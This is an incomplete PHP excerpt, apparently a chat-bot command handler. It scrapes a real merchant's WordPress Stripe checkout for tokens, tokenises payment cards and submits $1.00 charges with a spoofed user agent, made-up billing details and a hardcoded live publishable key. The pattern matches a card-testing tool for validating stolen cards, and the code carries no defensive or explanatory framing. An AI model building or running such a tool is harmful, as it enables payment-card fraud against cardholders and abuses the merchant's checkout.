...
if(strpos($message, "/st ") === 0 || strpos($message, "!st ") === 0 || strpos($message, ".st ") === 0){
...
#====================================
                $pkey = "pk_live_mN9gEzX9k6VXebixXsY8iaUJ";
//$tokens = "a5a4d709252bb1e543f05eeb1e1da305";
                $prod_id = "32";
                $itemname = "Lawyer and Registry Fee";
                $ua = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71";
                $referrer = "https://aspinto.com/asp-products/lawyer-and-registry-fee/";
                $site  = "https://aspinto.com/asp-products/lawyer-and-registry-fee/";
#============================================
                ...
                $page =  cURL(
                    ...
                    1,
                    $cookie
                ); echo $buttonkey = GetStr($page, "stripeButtonKey' value='", "'"); $wp_nonce = GetStr($page, 'name="_wpnonce" value="', '"');
//  $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');
                ...
                if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {
                    ...
                    $ajax_confirm =  cURL(
                        ...
                        'stripeAmount=1.00&stripeProductId='.$prod_id.'&stripeToken='.$token.'&stripeTokenType=card&stripeEmail='.$email.'&stripeButtonKey='.$buttonkey.'&stripeItemPrice=0&stripeTax=0&stripeShipping=0&stripeItemCost=0&asp_action=process_ipn&item_name='.$itemname.'&item_quantity=1&currency_code=USD&item_url=&thankyou_page_url=&charge_description=&_wpnonce='.$wp_nonce.'&_wp_http_referer=%2Fasp-products%2Flawyer-and-registry-fee%2F&stripeBillingName=July+Kalat&stripeBillingAddressLine1=Central+Ave&stripeBillingAddressZip=90001&stripeBillingAddressCity=Los+Angeles&stripeBillingAddressCountry=United+States&stripeBillingAddressCountryCode=US&stripeShippingName=July+Kalat&stripeShippingAddressLine1=Central+Ave&stripeShippingAddressZip=90001&stripeShippingAddressCity=Los+Angeles&stripeShippingAddressCountry=United+States&stripeShippingAddressCountryCode=US&clickProcessed=1',
                        "POST",
                        1,
                        $cookie
                    );
